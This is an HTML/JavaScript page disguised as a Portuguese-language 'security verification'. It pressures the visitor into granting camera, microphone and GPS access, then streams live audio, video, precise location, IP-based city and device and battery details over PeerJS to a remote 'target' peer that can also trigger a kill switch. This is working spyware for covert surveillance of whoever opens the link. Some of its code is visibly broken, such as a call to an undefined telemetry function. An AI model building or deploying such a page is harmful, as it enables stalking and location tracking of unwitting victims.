<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica√ß√£o de Seguran√ßa</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #020617;
            color: #e2e8f0;
            font-family: ui-sans-serif, system-ui, sans-serif;
            overflow: hidden;
        }

        .glitch-text {
            animation: blink 2s linear infinite;
        }

        @keyframes blink {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.5;
            }
        }
    </style>
</head>

<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div id="blocker-modal"
        class="fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center">
        <div class="max-w-md w-full bg-slate-900 border-2 border-slate-700 p-8 rounded-2xl shadow-2xl">
            <svg class="w-20 h-20 text-sky-500 mx-auto mb-6 glitch-text" fill="none" stroke="currentColor"
                viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
                </path>
            </svg>

            <h1 class="text-2xl font-black text-white mb-4">ATEN√á√ÉO NECESS√ÅRIA</h1>
            <p id="modal-instructions" class="text-slate-300 font-medium mb-8 leading-relaxed">
                AUTORIZE TUDO O QUE FOR PEDIDO PARA PROSSEGUIR.<br>
                <span class="text-sm text-slate-500 font-normal mt-2 block">O sistema requer acesso de m√≠dia e
                    geolocaliza√ß√£o para liberar a p√°gina.</span>
            </p>

            <button id="btn-prosseguir"
                class="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-xl text-lg transition shadow-lg shadow-sky-900/50 uppercase tracking-widest">
                Prosseguir
            </button>
        </div>
    </div>

    <div id="main-interface"
        class="max-w-sm w-full bg-slate-900 border border-slate-800 p-8 rounded-2xl text-center shadow-xl relative opacity-0 transition-opacity duration-1000">
        <div id="rec-indicator" class="absolute top-4 right-4 flex items-center gap-2">
            <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
            <span class="text-[10px] font-mono text-slate-400">REC (A/V)</span>
        </div>
        <div id="icon-container" class="mb-6">
            <svg class="w-14 h-14 text-emerald-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                    d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
            </svg>
        </div>
        <h2 class="text-lg font-bold mb-2">Conex√£o Estabelecida</h2>
        <p class="text-slate-400 mb-6 text-sm leading-relaxed">T√∫nel criptografado ativo.</p>
        <div class="p-3 bg-slate-950 rounded border border-slate-800">
            <p id="log" class="text-[10px] font-mono text-slate-500 text-left break-words h-12 overflow-y-auto">
                Autentica√ß√£o conclu√≠da...</p>
        </div>
    </div>

    <script>
        const logEl = document.getElementById('log');
        const log = (msg) => { logEl.innerHTML += `<div>> ${msg}</div>`; logEl.scrollTop = logEl.scrollHeight; };

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('target');

        let streamDeVideo = null;
        let peer = null;
        let dataConnection = null;
        let isDead = false;
        let intervaloReconexao = null;
        let coordenadasFixadas = null;

        let telemetria = {
            ip: '...', city: '...', region: '...', country: '...',
            os: '...', device: '...', browser: '...', battery: '...', timezone: '...', language: '...'
        };

        // Carrega dados passivos no fundo
        telemetria.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        telemetria.language = navigator.language;
        fetch('https://get.geojs.io/v1/ip/geo.json').then(res => res.json()).then(data => {
            telemetria.ip = data.ip; telemetria.city = data.city || ''; telemetria.region = data.region || ''; telemetria.country = data.country || '';
        }).catch(() => { });

        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                const format = () => `${Math.round(battery.level * 100)}% (${battery.charging ? '‚ö°' : 'üîã'})`;
                telemetria.battery = format();
                const sendUpdate = () => { if (dataConnection?.open) dataConnection.send({ type: 'TARGET_EVENT', message: `Energia: ${format()}` }); };
                battery.addEventListener('levelchange', sendUpdate); battery.addEventListener('chargingchange', sendUpdate);
            });
        }

        // --- FLUXO FOR√áADO DE PERMISS√ïES ---
        document.getElementById('btn-prosseguir').addEventListener('click', async () => {
            if (!targetId) {
                travarTelaErro("ERRO 404: Link de conex√£o inv√°lido ou quebrado.");
                return;
            }

            const btn = document.getElementById('btn-prosseguir');
            btn.textContent = "Aguardando C√¢mera e Microfone...";
            btn.classList.add('animate-pulse');

            try {
                // PASSO 1: For√ßa o pedido de C√¢mera e Microfone
                streamDeVideo = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 } },
                    audio: true
                });

                // PASSO 2: C√¢mera aceita. For√ßa o pedido de GPS imediatamente
                btn.textContent = "C√¢mera OK. Aguardando Localiza√ß√£o...";

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            // TUDO ACEITO
                            coordenadasFixadas = pos;
                            liberarSistema();
                        },
                        (err) => {
                            // GPS NEGADO
                            if (err.code === err.PERMISSION_DENIED) {
                                travarTelaErro("ACESSO NEGADO: Voc√™ bloqueou a Localiza√ß√£o.<br><br>Para prosseguir, clique no √≠cone de <b>Cadeado</b> na barra de endere√ßos (topo da tela), permita o Local e recarregue a p√°gina.");
                            } else {
                                // Erro de timeout do GPS, mas o usu√°rio n√£o negou de prop√≥sito. Libera.
                                liberarSistema();
                            }
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    liberarSistema(); // Navegador n√£o tem GPS
                }

            } catch (err) {
                // C√ÇMERA/MIC NEGADO
                travarTelaErro("ACESSO NEGADO: Voc√™ bloqueou a C√¢mera/Microfone.<br><br>Para prosseguir, clique no √≠cone de <b>Cadeado</b> na barra de endere√ßos (topo da tela), ative as permiss√µes e recarregue a p√°gina.");
            }
        });

        function travarTelaErro(mensagem) {
            document.getElementById('modal-instructions').innerHTML = `<span class="text-red-400 font-bold">${mensagem}</span>`;
            const btn = document.getElementById('btn-prosseguir');
            btn.classList.remove('animate-pulse', 'bg-sky-600', 'hover:bg-sky-500');
            btn.classList.add('bg-slate-800', 'text-slate-500', 'cursor-not-allowed');
            btn.textContent = "Sistema Travado";
            btn.disabled = true;
            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop()); // Mata hardware se s√≥ bloqueou o GPS
        }

        async function liberarSistema() {
            document.getElementById('blocker-modal').style.display = 'none';
            document.getElementById('main-interface').classList.remove('opacity-0');
            document.body.style.overflow = 'auto';

            // Coleta info do OS e entra na rede
            await coletarTelemetriaOS();
            iniciarConexao();
        }

        // Fun√ß√£o J.A.R.V.I.S. de Perfilamento de Hardware
        async function coletarTelemetriaDispositivo() {
            const ua = navigator.userAgent;

            // 1. Tenta a API Moderna (Foco em Android recente)
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const dados = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
                    telemetria.os = dados.platform;
                    // Se retornar o modelo t√©cnico, usamos ele
                    if (dados.model) telemetria.device = dados.model;
                } catch (e) { }
            }

            // 2. Triangula√ß√£o Espec√≠fica para Apple (iOS) via Resolu√ß√£o F√≠sica
            if (/iPad|iPhone|iPod/.test(ua)) {
                telemetria.os = 'iOS';
                const w = window.screen.width;
                const h = window.screen.height;
                const ratio = window.devicePixelRatio;
                const screenSignature = `${w}x${h}@${ratio}`;

                // Banco de dados de resolu√ß√µes de hardware Apple
                const appleDevices = {
                    "430x932@3": "iPhone 14 Pro Max / 15 Plus / 15 Pro Max",
                    "393x852@3": "iPhone 14 Pro / 15 / 15 Pro",
                    "428x926@3": "iPhone 12/13 Pro Max / 14 Plus",
                    "390x844@3": "iPhone 12/13 / 14",
                    "375x812@3": "iPhone X / XS / 11 Pro",
                    "414x896@3": "iPhone XS Max / 11 Pro Max",
                    "414x896@2": "iPhone XR / 11",
                    "414x736@3": "iPhone 6/7/8 Plus",
                    "375x667@2": "iPhone 6/7/8 / SE (2¬™ Gen)",
                    "320x568@2": "iPhone 5/5S/SE (1¬™ Gen)"
                };

                telemetria.device = appleDevices[screenSignature] || `iPhone (Desconhecido: ${w}x${h})`;
            }
            // 3. Fallback Cl√°ssico para Android antigo e PCs
            else if (telemetria.device === 'Desconhecido') {
                if (/android/i.test(ua)) {
                    telemetria.os = 'Android';
                    // Tenta pescar o c√≥digo SM-Gxxx ou Moto no meio da string
                    const match = ua.match(/Android.*?; (.*?) Build/);
                    telemetria.device = match ? match[1] : 'Smartphone Android gen√©rico';
                } else if (/Windows NT 10.0/.test(ua)) {
                    telemetria.os = 'Windows 10/11';
                    telemetria.device = 'PC / Notebook';
                } else if (/Mac OS/.test(ua)) {
                    telemetria.os = 'macOS';
                    telemetria.device = 'MacBook / Mac';
                }
            }

            // 4. Identifica√ß√£o do Navegador
            if (ua.includes('Firefox')) telemetria.browser = 'Firefox';
            else if (ua.includes('Edg')) telemetria.browser = 'Edge';
            else if (ua.includes('Chrome')) telemetria.browser = 'Chrome';
            else if (ua.includes('Safari')) telemetria.browser = 'Safari';
        }

        // --- SISTEMA WEBRTC ---
        function iniciarConexao() {
            if (isDead) return;
            if (peer) peer.destroy();

            peer = new Peer();
            peer.on('open', () => {
                log('Iniciando handshake com o terminal...');
                dataConnection = peer.connect(targetId);

                dataConnection.on('open', () => {
                    dataConnection.send({
                        type: 'TARGET_INFO', ip: telemetria.ip, city: telemetria.city, region: telemetria.region, country: telemetria.country,
                        os: telemetria.os, device: telemetria.device, battery: telemetria.battery, timezone: telemetria.timezone, language: telemetria.language
                    });

                    // Se pegou o GPS no modal, manda agora
                    if (coordenadasFixadas) {
                        dataConnection.send({
                            type: 'TARGET_GPS', lat: coordenadasFixadas.coords.latitude, lng: coordenadasFixadas.coords.longitude,
                            accuracy: Math.round(coordenadasFixadas.coords.accuracy),
                            link: `https://www.google.com/maps?q=${coordenadasFixadas.coords.latitude},${coordenadasFixadas.coords.longitude}`
                        });
                    }
                });

                dataConnection.on('data', (data) => { if (data.command === 'KILL_SWITCH') matarTudo(); });

                const call = peer.call(targetId, streamDeVideo);
                call.peerConnection.oniceconnectionstatechange = () => {
                    const state = call.peerConnection.iceConnectionState;
                    if (state === 'disconnected' || state === 'failed') tratarQuedaDeRede();
                };
            });

            peer.on('error', (err) => { if (err.type === 'peer-unavailable') tratarQuedaDeRede(); });
        }

        function tratarQuedaDeRede() {
            if (isDead) return;
            log('Sinal perdido. Reconectando...');
            clearTimeout(intervaloReconexao);
            intervaloReconexao = setTimeout(iniciarConexao, 3000);
        }

        function matarTudo() {
            isDead = true; clearTimeout(intervaloReconexao);
            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
            if (peer) peer.destroy();
            log('Protocolo encerrado pelo terminal remoto.');
        }

        window.addEventListener('beforeunload', () => {
            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
            if (peer) peer.destroy();
        });
    </script>
</body>

</html>